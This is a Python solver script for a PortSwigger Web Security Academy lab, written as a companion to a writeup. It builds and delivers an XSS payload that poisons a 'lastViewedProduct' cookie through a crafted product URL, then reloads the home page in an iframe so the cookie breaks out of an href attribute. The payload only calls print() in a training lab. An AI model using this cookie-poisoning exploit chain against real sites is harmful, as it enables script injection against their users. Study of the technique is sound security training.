#!/usr/bin/env python3
"""
DOM-based cookie manipulation
PortSwigger Web Security Academy -- DOM-Based Vulnerabilities

Companion script for the writeup: 05-dom-based-cookie-manipulation.md

What this does:
    A product page writes `document.cookie = 'lastViewedProduct=' + window.location`
    verbatim -- no encoding -- and the home page later interpolates that cookie
    value straight into a single-quoted `href` attribute with no escaping. This
    builds a two-step iframe: it first loads a product URL whose query string
    contains a `'>` breakout followed by `<img src=x onerror=print()>`, which
    poisons the cookie the moment the product page's JS runs, then (via a
    `window.x` guard so it only fires once) redirects the same iframe to the
    home page, where the poisoned cookie is rendered unsafely. Delivered
    through the exploit server; the payload only executes once PortSwigger's
    own victim browser renders the delivered page, so the solve is confirmed
    by polling the lab's home page afterwards.

Usage:
    python 05-dom-based-cookie-manipulation.py <lab-url>
    e.g. python 05-dom-based-cookie-manipulation.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def get_exploit_server_url(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def find_product(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'href="(/product\?productId=\d+)"', r.text)
    return m.group(1) if m else None


def exploit_server_deliver(exploit_url, body_html):
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    with httpx.Client(follow_redirects=True, timeout=15) as c:
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "STORE",
        })
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit", "responseHead": headers,
            "responseBody": body_html, "formAction": "DELIVER_TO_VICTIM",
        })


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    exploit_url = get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] Could not find this lab's exploit server URL on the home page.")
        return
    print(f"[*] Exploit server: {exploit_url}")

    product_path = find_product(client, lab_url)
    if not product_path:
        print("[-] Could not find a product link on the home page.")
        return
    product_url = f"{lab_url}{product_path}"
    print(f"[*] Found product: {product_url}")

    # craft_cookie_manipulation_xss() -- breakout confirmed against the raw HTTP
    # response's single-quoted href, not a browser's normalized double-quote view.
    xss_payload = "'><img src=x onerror=print()>"
    poisoned_url = f"{product_url}&{xss_payload}" if "?" in product_url else f"{product_url}?x={xss_payload}"
    exploit_html = (
        f'<iframe src="{poisoned_url}" '
        f"onload=\"if(!window.x)this.src='{lab_url}/';window.x=1;\">"
        f"</iframe>"
    )
    print(f"[*] Exploit page:\n{exploit_html}")

    exploit_server_deliver(exploit_url, exploit_html)
    print("[*] Exploit stored and delivered to victim.")

    time.sleep(5)
    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- poisoned lastViewedProduct cookie broke out of the href attribute.")
    else:
        print("[-] Not solved yet -- give the victim browser a few more seconds and re-check.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
